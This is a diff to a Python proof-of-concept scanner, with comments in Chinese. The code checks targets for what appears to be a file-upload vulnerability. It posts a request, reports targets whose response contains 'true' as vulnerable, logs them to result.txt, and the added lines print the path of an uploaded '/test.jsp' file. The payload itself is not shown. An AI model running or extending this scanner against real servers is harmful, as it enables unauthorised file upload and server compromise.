@@ -62,12 +62,13 @@ def poc(target):
         'http':'http://127.0.0.1:8080',
         'https':'http://127.0.0.1:8080',
     }
+    result = target +'/test.jsp'
     try:
         res = requests.get(url=target,verify=False,timeout=10)
         if res.status_code == 200:
             res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10,proxies=proxy)
             if  res1.status_code == 200 and 'true' in res1.text:
-                print(f"[+]此url{target}存在漏洞")
+                print(f"[+]此url{target}存在漏洞,上传后的url为:{result}")
                 with open('result.txt','a',encoding='utf-8') as fp:
                     fp.write(target+'\n') 
             else:
